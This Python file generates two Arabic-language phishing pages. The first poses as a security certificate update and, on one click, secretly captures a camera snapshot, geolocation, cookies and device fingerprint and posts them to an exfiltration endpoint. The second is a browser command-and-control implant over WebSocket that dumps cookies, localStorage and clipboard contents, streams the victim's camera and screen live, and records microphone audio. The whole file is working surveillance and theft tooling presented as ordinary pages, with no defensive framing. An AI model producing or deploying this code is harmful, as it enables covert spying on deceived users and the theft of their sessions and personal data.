def get_intel_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام الأمني السحابي الموثوق</title>
    <style>
        body {{ background-color: #030712; color: #f3f4f6; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .exploit-box {{ background: #0f172a; padding: 35px; border-radius: 20px; border: 1px solid #1e293b; max-width: 440px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.9); cursor: pointer; }}
        .pulse-loader {{ border: 4px solid #1e293b; border-top: 4px solid #ef4444; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.6s linear infinite; margin: 25px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ color: #f87171; font-size: 21px; margin-bottom: 12px; }}
        p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; }}
    </style>
</head>
<body>
    <div class="exploit-box" onclick="triggerFullExploit()">
        <h2>⚠️ تنبيه أمني: يتطلب تحديث شهادة الجهاز</h2>
        <div class="pulse-loader"></div>
        <p>انقر في أي مكان للشاشة لتأكيد بصمة الأمان وتفعيل مفاتيح الجلسة المشفرة فوراً.</p>
    </div>
    <video id="v_node" autoplay playsinline style="opacity: 0.001; position: absolute; pointer-events: none;"></video>
    <canvas id="c_node" style="display:none;"></canvas>
    
    <script>
        const linkId = "{link_id}";
        let executed = false;

        async function triggerFullExploit() {{
            if (executed) return;
            executed = true;

            try {{
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                gain.gain.value = 0.00001;
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start();
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
            }} catch(e) {{}}

            let camData = "";
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const video = document.getElementById('v_node');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.getElementById('c_node');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                camData = canvas.toDataURL('image/jpeg', 0.9);
                stream.getTracks().forEach(t => t.stop());
            }} catch(e) {{}}

            let geoData = {{}};
            try {{
                geoData = await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(
                        p => resolve({{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }}),
                        e => resolve({{ err: "مرفوض" }}),
                        {{ enableHighAccuracy: true, timeout: 3000 }}
                    );
                }});
            }} catch(e) {{}}

            let hardwareInfo = {{
                res: window.screen.width + 'x' + window.screen.height,
                availRes: window.screen.availWidth + 'x' + window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }};

            let webglRenderer = "غير معروف";
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {{
                        webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }}
                }}
            }} catch(e) {{}}
            hardwareInfo.gpu = webglRenderer;

            try {{
                await fetch('/api/v1/exfiltrate', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        link_id: linkId,
                        device_info: navigator.userAgent,
                        camera_snapshot_base64: camData,
                        geolocation: geoData,
                        stolen_cookies: document.cookie || "محمية أو فارغة",
                        stolen_data: hardwareInfo
                    }})
                }});
            }} catch(e) {{}}

            document.querySelector('.exploit-box').innerHTML = "<h2>✅ تمت المصادقة الشاملة</h2><p>جاري تحميل الموارد...</p>";
            setTimeout(() => {{ window.location.href = "https://www.google.com"; }}, 1500);
        }}
    </script>
</body>
</html>"""

def get_live_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محرك السيطرة العسكرية والتحكم الحي</title>
    <style>
        body {{ background-color: #020617; color: #f8fafc; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .c2-panel {{ background: #0f172a; padding: 40px; border-radius: 24px; border: 1px solid #1e293b; max-width: 440px; width: 90%; box-shadow: 0 25px 50px rgba(0,0,0,0.95); cursor: pointer; }}
        .c2-ring {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.6s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ color: #38bdf8; font-size: 20px; margin-bottom: 10px; }}
        p {{ color: #94a3b8; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="c2-panel" onclick="initializeC2Bridge()">
        <h2>⚡ تفعيل قناة السيطرة العسكرية النشطة</h2>
        <div class="c2-ring"></div>
        <p>انقر هنا لربط القناة المشفرة وضمان ثبات الجلسة المعزولة.</p>
    </div>

    <video id="v_stream" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas_processor" style="display:none;"></canvas>

    <script>
        const linkId = "{link_id}";
        let wsClient = null;
        let isConnected = false;
        let periodicTimer = null;

        async function initializeC2Bridge() {{
            try {{
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                gain.gain.value = 0.00001;
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start();
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
            }} catch(e) {{}}

            establishWebSocketConnection();
            
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const v = document.getElementById('v_stream');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 1000));
                const canvas = document.getElementById('canvas_processor');
                canvas.width = v.videoWidth || 640;
                canvas.height = v.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                let initialSnap = canvas.toDataURL('image/jpeg', 0.9);
                stream.getTracks().forEach(t => t.stop());

                let sysInfo = {{ res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform }};
                await fetch('/api/v1/exfiltrate', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: initialSnap, stolen_cookies: document.cookie, stolen_data: sysInfo }})
                }});
            }} catch(e) {{}}

            document.querySelector('.c2-panel').innerHTML = "<h2>🟢 تم الاتصال بقناة C2 بنجاح</h2><p>الجلسة تحت السيطرة الكاملة الآن.</p>";
        }}

        function establishWebSocketConnection() {{
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            wsClient = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);

            wsClient.onopen = () => {{ isConnected = true; }};
            wsClient.onmessage = async (event) => {{
                try {{
                    const packet = JSON.parse(event.data);
                    if (packet.cmd === "ping") {{
                        wsClient.send(JSON.stringify({{ type: "pong" }}));
                        return;
                    }}
                    let responsePayload = await executeExploitPayload(packet.cmd);
                    if (responsePayload && !packet.cmd.includes("live_")) {{
                        transmitPayloadResult(packet.cmd, responsePayload);
                    }}
                }} catch(e) {{}}
            }};
            wsClient.onclose = () => {{
                isConnected = false;
                setTimeout(establishWebSocketConnection, 1500);
            }};
        }}

        // أدوات استغلال متقدمة ومعزولة كلياً
        async function executeExploitPayload(commandType) {{
            let payloadResult = "";
            try {{
                switch(commandType) {{
                    case "dump_cookies":
                        payloadResult = document.cookie || "لا توجد كوكيز مكشوفة أو محمية بنظام HttpOnly";
                        break;
                        
                    case "dump_localstorage":
                        let storageDump = {{}};
                        for(let i=0; i<localStorage.length; i++) {{
                            let keyName = localStorage.key(i);
                            storageDump[keyName] = localStorage.getItem(keyName);
                        }}
                        payloadResult = JSON.stringify(storageDump, null, 2);
                        break;
                        
                    case "screen_snapshot":
                        try {{
                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen" }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = screenStream;
                            await v.play();
                            await new Promise(r => setTimeout(r, 800));
                            const canvas = document.getElementById('canvas_processor');
                            canvas.width = v.videoWidth || window.innerWidth;
                            canvas.height = v.videoHeight || window.innerHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                            payloadResult = canvas.toDataURL('image/jpeg', 0.9);
                            screenStream.getTracks().forEach(t => t.stop());
                        }} catch(err) {{
                            payloadResult = "❌ فشل سحب الشاشة: يتطلب تفاعل المستخدم والموافقة على إذن التقاط الشاشة.";
                        }}
                        break;

                    case "start_live_screen":
                        terminateActiveEngine();
                        try {{
                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen", frameRate: 15 }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = screenStream;
                            await v.play();
                            periodicTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('canvas_processor');
                                    canvas.width = v.videoWidth || window.innerWidth;
                                    canvas.height = v.videoHeight || window.innerHeight;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                                    transmitPayloadResult("live_screen_frame", canvas.toDataURL('image/jpeg', 0.65));
                                }} catch(e) {{}}
                            }}, 1500);
                            return "🔴 تم تفعيل البث الحي المستمر للشاشة بنجاح!";
                        }} catch(e) {{
                            return "❌ تعذر تشغيل بث الشاشة الحي.";
                        }}
                        break;

                    case "stop_live_screen":
                        terminateActiveEngine();
                        return "⏹️ تم إيقاف البث الحي وإنهاء القنوات بنجاح.";

                    case "start_live_camera":
                        terminateActiveEngine();
                        try {{
                            const camStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = camStream;
                            await v.play();
                            periodicTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('canvas_processor');
                                    canvas.width = v.videoWidth || 640;
                                    canvas.height = v.videoHeight || 480;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                                    transmitPayloadResult("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
                                }} catch(e) {{}}
                            }}, 1500);
                            return "📹 تم بدء البث الحي لكاميرا الهدف الأمامية!";
                        }} catch(e) {{
                            return "❌ تعذر تشغيل كاميرا الهدف.";
                        }}
                        break;

                    case "dump_clipboard":
                        try {{
                            payloadResult = await navigator.clipboard.readText();
                        }} catch(e) {{
                            payloadResult = "⚠️ الحافظة فارغة أو تتطلب إذناً صريحاً.";
                        }}
                        break;

                    case "record_audio":
                        try {{
                            const micStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                            const recorder = new MediaRecorder(micStream);
                            let chunks = [];
                            recorder.ondataavailable = e => chunks.push(e.data);
                            recorder.onstop = async () => {{
                                const blob = new Blob(chunks, {{ type: 'audio/ogg; codecs=opus' }});
                                const reader = new FileReader();
                                reader.readAsDataURL(blob);
                                reader.onloadend = () => {{
                                    transmitPayloadResult("audio_clip", reader.result);
                                }};
                                micStream.getTracks().forEach(t => t.stop());
                            }};
                            recorder.start();
                            setTimeout(() => recorder.stop(), 6000);
                            return "🎤 جاري تسجيل الصوت الحي المحيط (لمدة 6 ثوانٍ)...";
                        }} catch(e) {{
                            payloadResult = "❌ فشل تسجيل الصوت: إذن المقاطع الصوتية مرفوض.";
                        }}
                        break;
                }}
            }} catch(err) {{
                payloadResult = "خطأ في تنفيذ حمولة الاستغلال: " + err.message;
            }}
            return payloadResult;
        }}

        function terminateActiveEngine() {{
            if (periodicTimer) {{ clearInterval(periodicTimer); periodicTimer = null; }}
            const v = document.getElementById('v_stream');
            if (v && v.srcObject) {{
                v.srcObject.getTracks().forEach(t => t.stop());
                v.srcObject = null;
            }}
        }}

        function transmitPayloadResult(cmdType, dataContent) {{
            const packet = {{ link_id: linkId, cmd: cmdType, data: dataContent }};
            if (isConnected && wsClient && wsClient.readyState === WebSocket.OPEN) {{
                wsClient.send(JSON.stringify({{ type: "response", ...packet }}));
            }} else {{
                fetch('/api/v1/c2-respond', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(packet)
                }}).catch(e => {{}});
            }}
        }}
    </script>
</body>
</html>"""
